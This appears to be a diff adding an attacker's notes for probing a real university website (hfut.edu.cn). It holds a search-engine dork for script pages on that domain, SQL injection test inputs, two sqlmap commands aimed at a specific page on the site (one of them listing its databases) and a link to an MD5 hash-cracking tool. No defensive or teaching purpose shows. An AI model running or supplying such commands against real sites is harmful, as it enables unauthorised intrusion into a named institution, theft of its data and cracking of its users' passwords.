@@ -1,0 +1,14 @@
+
+
+
+
+site:hfut.edu.cn inurl:asp|aspx|php|jsp
+'
+&1=1
+&1=2
+python sqlmap.py -u http://yxgcxy.hfut.edu.cn/about_teacher.php?tid=37
+python sqlmap.py -u http://yxgcxy.hfut.edu.cn/about_teacher.php?tid=37 --dbs
+
+
+
+https://github.com/Ephigenia/PHPMD5Crack
